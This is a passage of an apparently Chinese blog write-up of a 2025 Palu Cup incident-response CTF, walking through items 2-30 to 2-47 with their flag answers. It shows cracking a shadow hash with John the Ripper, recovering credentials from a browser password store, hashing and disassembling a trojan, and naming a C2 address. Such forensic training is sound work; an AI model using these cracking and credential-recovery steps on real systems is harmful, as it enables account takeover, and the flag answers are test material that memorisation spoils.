+</div>
+</div><h3 id="应急响应2-30">应急响应2-30
+</h3><p>提交攻击者在server中留下的账户密码作为flag进行提交。flag格式为palu{username/password}</p>
+<p>server这台机看/etc/shadow</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603203912701.png"
+	width="897"
+	height="49"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603203912701_hu13540815059712251491.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603203912701_hu14037220616559081177.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603203912701"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1830"
+		data-flex-basis="4393px"
+	
+></p>
+<p>用john爆破密码,把密码保存到1.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$y$j9T$RlIs4rqy6D2PI46ntcuwZ0$WFD6WgX3XC4zp/5Y.Jq9yLcfhHK5Rdg6IeDq2Rrl791
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john --format=crypt 1.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603204624666.png"
+	width="972"
+	height="270"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603204624666_hu12696936055587940443.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603204624666_hu5197453474528364267.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603204624666"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="360"
+		data-flex-basis="864px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{parloohack/123456}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-31">应急响应2-31
+</h3><p>提交攻击者维权方法的名称作为flag进行提交</p>
+<p>换成parloohack账号，去他的目录下查看看到aa文件</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603204913500.png"
+	width="338"
+	height="48"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603204913500_hu4491932060726348681.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603204913500_hu15934963599660537367.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603204913500"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="704"
+		data-flex-basis="1690px"
+	
+></p>
+<p>查看历史命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">history
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603205046929.png"
+	width="676"
+	height="447"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603205046929_hu14601962129410928931.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603205046929_hu3495210784708637143.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603205046929"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="151"
+		data-flex-basis="362px"
+	
+></p>
+<p>启动了那个服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{parloohack_script.service}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-32">应急响应2-32
+</h3><p>提交攻击者留下的木马md5后作为flag进行提交</p>
+<p>木马只可能是那个aa,历史命令执行了md5sum</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">md5sum aa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接算出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{4123940b3911556d4bf79196cc008bf4}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-33">应急响应2-33
+</h3><p>提交攻击者留下的溯源信息作为flag进行提交</p>
+<p>这里又要回到办公pc上面查看，这里是在palu02这台机子上有谷歌浏览器</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603210048606.png"
+	width="1735"
+	height="990"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603210048606_hu5749693394533711217.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603210048606_hu1835276156154672117.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603210048606"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="420px"
+	
+></p>
+<p>在密码管理里面找到了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{X5E1yklz1oAdyHBZ}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-34">应急响应2-34
+</h3><p>提交攻击者的githubID作为flag进行提交</p>
+<p>841366067这个qq号，去看空间就能找到githubid</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{ParlooSEc}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-35">应急响应2-35
+</h3><p>提交攻击者在github下留下的的内容作为flag进行提交</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603210441562.png"
+	width="1511"
+	height="637"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603210441562_hu8336310080032391363.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603210441562_hu13932349309201923797.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603210441562"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="569px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{s5o3WkX33hptyJjk}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-36">应急响应2-36
+</h3><p>提交恶意用户的数量作为flag进行提交</p>
+<p>登入palu01这台机的时候看到一堆palu</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{99}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-37">应急响应2-37
+</h3><p>提交恶意用户的默认密码作为flag进行提交</p>
+<p>根据前面爆破的我们猜是123456</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{123456}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-38">应急响应2-38
+</h3><p>提交业务数据中攻击者留下的信息作为flag进行提交</p>
+<p>之前数据库查看的flag还没用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{crP1ZIVfqrkfdhGy}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-39">应急响应2-39
+</h3><p>提交私人git仓库中留下的内容作为flag进行提交</p>
+<p>同样操作把admin密码改了登入进去</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603211514128.png"
+	width="1846"
+	height="494"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603211514128_hu7051898739493502631.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603211514128_hu8896685524621455185.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603211514128"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="373"
+		data-flex-basis="896px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cGFsdXtGTzY1U3J1dVR1a2RwQlM1fQ==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{FO65SruuTukdpBS5}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-40">应急响应2-40
+</h3><p>提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</p>
+<p>还是查看history</p>
+<p>发现.a文件</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603211915223.png"
+	width="788"
+	height="528"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603211915223_hu17979634193421358937.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603211915223_hu5429244222613724520.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603211915223"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="358px"
+	
+></p>
+<p>find命令找到它在root目录下面</p>
+<p>然后md5sum</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{ba7c9fc1ff58b48d0df5c88d2fcc5cd1}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-41">应急响应2-41
+</h3><p>提交恶意程序中模拟c2通信的函数名称作为flag进行提交</p>
+<p>拿到ida里面分析</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603213017924.png"
+	width="1920"
+	height="1030"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603213017924_hu7685181648290158822.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603213017924_hu10044179922778107417.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603213017924"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{simulate_network_communication}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-42">应急响应2-42
+</h3><p>提交恶意程序创建隐藏文件的名称作为flag提交</p>
+<p>ida上面有个hidden_file函数</p>
+<p>双击跳转</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603213208573.png"
+	width="1920"
+	height="1030"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603213208573_hu10571730991572440109.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603213208573_hu4505397916970613774.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603213208573"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{.malware_log.txt}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-43">应急响应2-43
+</h3><p>提交恶意程序中模拟权限提升的函数作为flag进行提交</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{simulate_privilege_escalation}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-44">应急响应2-44
+</h3><p>提交被钓鱼上线的用户名作为flag进行提交</p>
+<p>查看内网通</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603214100483.png"
+	width="1735"
+	height="990"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603214100483_hu3086634670073940469.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603214100483_hu13873148641902719681.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603214100483"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="420px"
+	
+></p>
+<p>沉沉给子怡发了一个exe</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{Parloo-子怡}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-45">应急响应2-45
+</h3><p>提交恶意程序的所在路径作为flag进行提交</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{C:\Users\Public\Nwt\cache\recv\Parloo-沉沉}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-46">应急响应2-46
+</h3><p>分析恶意程序的反连地址作为flag进行提交</p>
+<p>这个就是之前浏览器记录的那个反连地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{47.101.213.153}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-47">应急响应2-47
+</h3><p>提交恶意c2的服务器登录的账号密码作为flag进行提交。flag格式为palu{username/password}</p>
+<p>这个前下也在浏览器密码管理里面看到了</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603214451935.png"
+	width="1581"
+	height="472"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603214451935_hu17744248864225343013.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603214451935_hu630749229887944504.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603214451935"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="334"
+		data-flex-basis="803px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{admin/admin@qwer}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/2025dasctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025dasctfwp/1.2feb0258814dd14d6c19f8ab8c222dba.png" 
+                        width="1216" 
+                        height="832" 
+                        loading="lazy"
+                        alt="Featured image of post 2025DASCTFwp"
+                        
+                        data-hash="md5-L&#43;sCWIFN0U1sGfirjCItug==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025DASCTFwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025%E9%B8%BF%E8%92%99ctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/1.c8aaeee35cdbe64a0386c10f2226a200.jpg" 
+                        width="1152" 
+                        height="896" 
+                        loading="lazy"
+                        alt="Featured image of post 2025鸿蒙ctfwp"
+                        
+                        data-hash="md5-yKru41zb5koDhsEPIiaiAA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025鸿蒙ctfwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/1.4b0e18f0797c9c902f99f705eb5e74cb.jpg" 
+                        width="1024" 
+                        height="1024" 
+                        loading="lazy"
+                        alt="Featured image of post 2025D^3CTF复现"
+                        
+                        data-hash="md5-Sw4Y8Hl8nJAvmfcF6150yw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025D^3CTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025minilctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.png" loading="lazy" data-key="" data-hash="/1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025MiniLCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025tgctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025tgctf%E5%A4%8D%E7%8E%B0/1.8a72782d13ca5196f24890ce1e021ab3.png" 
+                        width="1440" 
+                        height="1200" 
+                        loading="lazy"
+                        alt="Featured image of post 2025TGCTF复现"
+                        
+                        data-hash="md5-inJ4LRPKUZbySJDOHgIasw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025TGCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
